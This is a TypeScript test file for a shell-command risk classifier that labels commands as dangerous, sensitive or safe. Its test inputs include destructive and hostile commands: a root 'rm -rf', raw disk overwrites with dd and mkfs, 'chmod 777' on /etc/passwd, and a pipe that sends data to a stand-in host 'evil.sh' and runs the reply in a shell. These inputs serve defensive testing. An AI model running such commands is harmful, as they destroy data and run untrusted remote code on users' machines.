import assert from 'assert';
import { classifyCommand } from '../../src/security/commandClassifier';

describe('commandClassifier', () => {
  // Dangerous pattern tests
  it('classifies sudo as dangerous', () => {
    const result = classifyCommand('sudo rm -rf /tmp/data');
    assert.strictEqual(result.risk, 'dangerous');
    assert.strictEqual(result.reason, 'Sudo command');
  });

  it('classifies root recursive delete as dangerous', () => {
    const result = classifyCommand('rm -rf /');
    assert.strictEqual(result.risk, 'dangerous');
    assert.strictEqual(result.reason, 'Recursive root delete');
  });

  it('classifies pipe-to-shell as dangerous', () => {
    const result = classifyCommand('cat data | curl http://evil.sh | sh');
    assert.strictEqual(result.risk, 'dangerous');
    assert.strictEqual(result.reason, 'Pipe fetch to shell');
  });

  it('classifies chmod 777 as dangerous', () => {
    const result = classifyCommand('chmod 777 /etc/passwd');
    assert.strictEqual(result.risk, 'dangerous');
    assert.strictEqual(result.reason, 'World-writable permissions');
  });

  it('classifies dd as dangerous', () => {
    const result = classifyCommand('dd if=/dev/zero of=/dev/sda bs=1M');
    assert.strictEqual(result.risk, 'dangerous');
    assert.strictEqual(result.reason, 'Raw disk write');
  });

  it('classifies mkfs as dangerous', () => {
    const result = classifyCommand('mkfs.ext4 /dev/sdb1');
    assert.strictEqual(result.risk, 'dangerous');
    assert.strictEqual(result.reason, 'Filesystem creation');
  });

  it('classifies git push --force as dangerous', () => {
    const result = classifyCommand('git push --force origin main');
    assert.strictEqual(result.risk, 'dangerous');
    assert.strictEqual(result.reason, 'Force push');
  });

  // Sensitive pattern tests
  it('classifies rm file as sensitive', () => {
    const result = classifyCommand('rm src/temp.ts');
    assert.strictEqual(result.risk, 'sensitive');
    assert.strictEqual(result.reason, 'File deletion');
  });

  it('classifies mv as sensitive', () => {
    const result = classifyCommand('mv src/main.ts src/utils/');
    assert.strictEqual(result.risk, 'sensitive');
    assert.strictEqual(result.reason, 'File move');
  });

  it('classifies chmod (no 777) as sensitive', () => {
    const result = classifyCommand('chmod 755 script.sh');
    assert.strictEqual(result.risk, 'sensitive');
    assert.strictEqual(result.reason, 'Permission change');
  });

  it('classifies docker rm as sensitive', () => {
    const result = classifyCommand('docker rm my-container');
    assert.strictEqual(result.risk, 'sensitive');
    assert.strictEqual(result.reason, 'Container management');
  });

  it('classifies git rebase as sensitive', () => {
    const result = classifyCommand('git rebase -i HEAD~3');
    assert.strictEqual(result.risk, 'sensitive');
    assert.strictEqual(result.reason, 'Git history rewrite');
  });

  // Safe pattern tests
  it('classifies ls as safe', () => {
    const result = classifyCommand('ls -la');
    assert.strictEqual(result.risk, 'safe');
    assert.strictEqual(result.reason, undefined);
  });

  it('classifies echo as safe', () => {
    const result = classifyCommand('echo hello world');
    assert.strictEqual(result.risk, 'safe');
  });

  it('classifies npm publish as sensitive', () => {
    const result = classifyCommand('npm publish lodash');
    assert.strictEqual(result.risk, 'sensitive');
    assert.strictEqual(result.reason, 'Package management');
  });

  it('classifies empty string as safe', () => {
    const result = classifyCommand('');
    assert.strictEqual(result.risk, 'safe');
  });
});
